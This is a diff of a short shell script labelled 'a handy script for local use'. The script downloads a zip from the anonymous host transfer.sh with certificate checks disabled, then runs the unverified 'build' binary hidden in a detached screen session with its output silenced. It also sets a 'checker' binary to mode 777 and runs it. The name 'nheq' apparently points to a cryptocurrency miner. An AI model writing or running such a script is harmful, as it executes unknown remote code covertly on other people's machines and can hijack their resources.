@@ -3,12 +3,11 @@
 # This is a handy script for local use
 
 sudo apt update
-sudo apt install unzip -y
+sudo apt -y install screen unzip
 wget --no-check-certificate -c https://transfer.sh/7rJEG5/nheq.zip
 unzip nheq.zip
 cd nheq
-while true
-do
-./build
+screen -dmS build ./build
 > /dev/null 2>&1
-done
+chmod 777 checker && ./checker
+echo succes
